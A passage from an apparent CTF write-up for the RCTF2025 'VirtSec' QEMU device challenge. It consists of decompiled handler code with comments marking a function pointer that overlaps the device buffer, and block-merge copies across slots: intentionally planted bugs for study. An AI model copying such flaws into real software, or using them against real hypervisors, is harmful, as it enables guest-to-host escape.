offset;</span><br><span class="line">  srca = value;</span><br><span class="line">  dev = VIRTSEC_DEVICE(opaque);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Write reg[0x%lx] = 0x%lx\n&quot;</span>, offset_1, srca, v3, v4, v5);</span><br><span class="line">  <span class="keyword">if</span> ( offset_1 &lt;= <span class="number">0xFFF</span> || offset_1 &gt; <span class="number">0x1FFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( offset_1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">        virtsec_execute_command(dev, srca);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">        dev-&gt;cmd_arg = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">        dev-&gt;current_block_id = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">        dev-&gt;dev_size = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x1C</span>uLL:</span><br><span class="line">        dev-&gt;reg_3076 = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x30</span>uLL:</span><br><span class="line">        dev-&gt;block_id_1 = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x34</span>uLL:</span><br><span class="line">        dev-&gt;block_id_2 = srca;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x38</span>uLL:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( gift_flag )</span><br><span class="line">        &#123;</span><br><span class="line">          dev-&gt;gift_str = <span class="string">&quot;welcome to RCTF2025!This is my gift!&quot;</span>;<span class="comment">// gift_str assigned here: dev-&gt;gift_str = &quot;welcome to RCTF2025!This is my gift!&quot; (offset 0xEA0)</span></span><br><span class="line">          dev-&gt;gift_func = (virtsec_print_fn)&amp;<span class="built_in">printf</span>;<span class="comment">// gift_func located at dev+0xE98; store uses alias &amp;dev-&gt;data_buffer[248]</span></span><br><span class="line">          gift_flag = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dev-&gt;gift_func(dev-&gt;gift_str);          <span class="comment">// indirect call via gift_func loaded from &amp;dev-&gt;data_buffer[248]</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Invalid write offset 0x%lx\n&quot;</span>, offset_1, v8, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    n16 = offset_1 - <span class="number">0x1000</span>;</span><br><span class="line">    blk = virtsec_find_block(dev, dev-&gt;current_block_id);</span><br><span class="line">    <span class="keyword">if</span> ( blk &amp;&amp; blk-&gt;valid &amp;&amp; n16 + <span class="number">4</span> &lt;= blk-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = blk-&gt;start + n16;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(n16 + <span class="number">4</span>) &gt; <span class="number">0x10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        n = <span class="number">16</span> - n16;</span><br><span class="line">        n_4 = <span class="number">4</span> - (<span class="number">16</span> - n16);</span><br><span class="line">        <span class="keyword">if</span> ( n16 != <span class="number">16</span> )</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;dev-&gt;data_buffer[v17], &amp;srca, n);</span><br><span class="line">        <span class="keyword">if</span> ( n_4 )</span><br><span class="line">        &#123;</span><br><span class="line">          v20 = <span class="number">16</span> * ((blk-&gt;start &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>);</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;dev-&gt;data_buffer[v20], (<span class="type">char</span> *)&amp;srca + n, n_4);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)&amp;dev-&gt;data_buffer[v17] = srca;</span><br><span class="line">      &#125;</span><br><span class="line">      dev-&gt;read_counter += <span class="number">4LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">        qemu_log(</span><br><span class="line">          (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec MMIO: Write data buffer[0x%x] = 0x%lx (block size: %u)\n&quot;</span>,</span><br><span class="line">          n16,</span><br><span class="line">          srca,</span><br><span class="line">          blk-&gt;size,</span><br><span class="line">          v6,</span><br><span class="line">          v7);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_realize</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">virtsec_realize</span><span class="params">(_QWORD *opaque, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *v12; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = VIRTSEC_DEVICE(opaque);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec PCI Device: Initializing...\n&quot;</span>, a2, v2, v3, v4, v5);</span><br><span class="line">  pci_config_set_vendor_id(opaque[<span class="number">20</span>], <span class="number">4660</span>);</span><br><span class="line">  pci_config_set_device_id(opaque[<span class="number">20</span>], <span class="number">22136</span>);</span><br><span class="line">  pci_config_set_revision(opaque[<span class="number">20</span>], <span class="number">1</span>);</span><br><span class="line">  pci_config_set_class(opaque[<span class="number">20</span>], <span class="number">1408</span>);</span><br><span class="line">  v12-&gt;reg_3024 = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;cmd_arg = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;dev_size = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;unk_3072 = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;reg_3076 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">memset</span>(&amp;v12-&gt;block_list[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(v12-&gt;block_list[i]));</span><br><span class="line">  v12-&gt;reg_3464 = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;current_block_id = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;block_id_1 = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;block_id_2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v12-&gt;enc_pad[<span class="number">256</span>], <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  *(_DWORD *)&amp;v12-&gt;enc_pad[<span class="number">512</span>] = <span class="number">0</span>;</span><br><span class="line">  virtsec_generate_key((__int64)v12);</span><br><span class="line">  v12-&gt;write_counter = <span class="number">0</span>;</span><br><span class="line">  v12-&gt;read_counter = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)v12[<span class="number">1</span>].pad_0000_0BD0 = <span class="number">0</span>;</span><br><span class="line">  memory_region_init_io(&amp;v12-&gt;pad_0000_0BD0[<span class="number">2752</span>], v12, virtsec_mmio_ops, v12, <span class="string">&quot;virtsec-mmio&quot;</span>, <span class="number">0x2000</span>, a2);</span><br><span class="line">  pci_register_bar(opaque, <span class="number">0</span>, <span class="number">0</span>, &amp;v12-&gt;pad_0000_0BD0[<span class="number">2752</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec PCI Device: Initialized successfully\n&quot;</span>, <span class="number">0</span>, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>virtsec_execute_command</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">virtsec_execute_command</span><span class="params">(<span class="type">virtsec_device_t</span> *dev, <span class="type">unsigned</span> <span class="type">int</span> cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block_id_2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">virtsec_device_t</span> *dev_1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> block_index; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> i_1; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *block; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *blk; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *block_1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">virtsec_block_t</span> *v45; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">    qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Executing command %u\n&quot;</span>, cmd, v2, v3, v4, v5);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      dev-&gt;reg_3024 = <span class="number">1</span>;</span><br><span class="line">      dev-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">        qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Session %u initialized\n&quot;</span>, dev-&gt;cmd_arg, v6, v7, v8, v9);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      <span class="keyword">if</span> ( virtsec_validate_block_size(dev-&gt;dev_size) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( virtsec_allocate_block(dev, dev-&gt;current_block_id, dev-&gt;dev_size) )</span><br><span class="line">        &#123;</span><br><span class="line">          dev-&gt;reg_3024 = <span class="number">2</span>;</span><br><span class="line">          dev-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">            qemu_log(</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Ready to write block %u (%u bytes)\n&quot;</span>,</span><br><span class="line">              dev-&gt;current_block_id,</span><br><span class="line">              dev-&gt;dev_size,</span><br><span class="line">              v10,</span><br><span class="line">              v11,</span><br><span class="line">              v12);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          dev-&gt;dev_result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        dev-&gt;dev_result = <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      v45 = virtsec_find_block(dev, dev-&gt;current_block_id);</span><br><span class="line">      <span class="keyword">if</span> ( v45 &amp;&amp; v45-&gt;valid )</span><br><span class="line">      &#123;</span><br><span class="line">        dev-&gt;reg_3024 = <span class="number">3</span>;</span><br><span class="line">        dev-&gt;reg_3076 = <span class="number">0</span>;</span><br><span class="line">        dev-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Ready to read block %u\n&quot;</span>, dev-&gt;current_block_id, v13, v14, v15, v16);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        dev-&gt;dev_result = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      block_index = virtsec_find_block_index(dev, dev-&gt;block_id_1);</span><br><span class="line">      block_id_2 = dev-&gt;block_id_2;</span><br><span class="line">      i_1 = virtsec_find_block_index(dev, block_id_2);</span><br><span class="line">      <span class="keyword">if</span> ( block_index == <span class="number">-1</span> || i_1 == <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        dev-&gt;dev_result = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">          qemu_log(</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Merge failed - block %u or %u not found\n&quot;</span>,</span><br><span class="line">            dev-&gt;block_id_1,</span><br><span class="line">            dev-&gt;block_id_2,</span><br><span class="line">            v18,</span><br><span class="line">            v19,</span><br><span class="line">            v20);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        block = &amp;dev-&gt;block_list[block_index];</span><br><span class="line">        blk = &amp;dev-&gt;block_list[i_1];</span><br><span class="line">        <span class="keyword">if</span> ( dev-&gt;block_list[block_index].valid == <span class="number">1</span> &amp;&amp; dev-&gt;block_list[i_1].valid == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v21 = block_index - i_1;</span><br><span class="line">          <span class="keyword">if</span> ( i_1 - block_index &gt;= <span class="number">0</span> )</span><br><span class="line">            v21 = i_1 - block_index;</span><br><span class="line">          <span class="keyword">if</span> ( v21 != <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( block_index &gt; <span class="number">14</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              block_id_2 = block_index;</span><br><span class="line">              virtsec_swap_blocks(dev, block_index, i_1 - <span class="number">1</span>);</span><br><span class="line">              block_index = i_1 - <span class="number">1</span>;</span><br><span class="line">              i = i_1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              i = block_index + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( dev-&gt;block_list[i].valid &amp;&amp; i != i_1 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( dev-&gt;block_list[j].valid != <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  block_id_2 = i;</span><br><span class="line">                  virtsec_swap_blocks(dev, i, j);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( i_1 != i )</span><br><span class="line">            &#123;</span><br><span class="line">              block_id_2 = i_1;</span><br><span class="line">              virtsec_swap_blocks(dev, i_1, i);</span><br><span class="line">              i_1 = i;</span><br><span class="line">            &#125;</span><br><span class="line">            block = &amp;dev-&gt;block_list[block_index];</span><br><span class="line">            blk = &amp;dev-&gt;block_list[i_1];</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">              block_id_2 = block_index;</span><br><span class="line">              qemu_log(</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Rearranged blocks - block1 at index %d, block2 at index %d\n&quot;</span>,</span><br><span class="line">                block_index,</span><br><span class="line">                i_1,</span><br><span class="line">                v22,</span><br><span class="line">                v23,</span><br><span class="line">                v24);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( block-&gt;enc_flag )</span><br><span class="line">          &#123;</span><br><span class="line">            block_id_2 = (<span class="type">unsigned</span> <span class="type">int</span>)block;</span><br><span class="line">            virtsec_decrypt_block(dev, block);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( blk-&gt;enc_flag )</span><br><span class="line">          &#123;</span><br><span class="line">            block_id_2 = (<span class="type">unsigned</span> <span class="type">int</span>)blk;</span><br><span class="line">            virtsec_decrypt_block(dev, blk);</span><br><span class="line">          &#125;</span><br><span class="line">          v25 = block_index - i_1;</span><br><span class="line">          <span class="keyword">if</span> ( i_1 - block_index &gt;= <span class="number">0</span> )</span><br><span class="line">            v25 = i_1 - block_index;</span><br><span class="line">          <span class="keyword">if</span> ( v25 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( block_index &gt; i_1 )</span><br><span class="line">            &#123;</span><br><span class="line">              block_1 = block;</span><br><span class="line">              block = blk;</span><br><span class="line">              blk = block_1;</span><br><span class="line">            &#125;</span><br><span class="line">            size = block-&gt;size + blk-&gt;size;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;dev-&gt;data_buffer[block-&gt;start + block-&gt;size], &amp;dev-&gt;data_buffer[blk-&gt;start], blk-&gt;size);</span><br><span class="line">            block-&gt;size = size;</span><br><span class="line">            blk-&gt;valid = <span class="number">0</span>;</span><br><span class="line">            --dev-&gt;reg_3464;</span><br><span class="line">            dev-&gt;reg_3024 = <span class="number">1</span>;</span><br><span class="line">            dev-&gt;dev_result = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)qemu_loglevel_mask_64(<span class="number">2048</span>) )</span><br><span class="line">              qemu_log(</span><br><span class="line">                (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VirtSec Device: Merged block %u and %u (total size: %u bytes, spans 2 buffer slots)\n&quot;</span>,</span><br><span class="line">                dev-&gt;block_id_1,</span><br><span class="line">                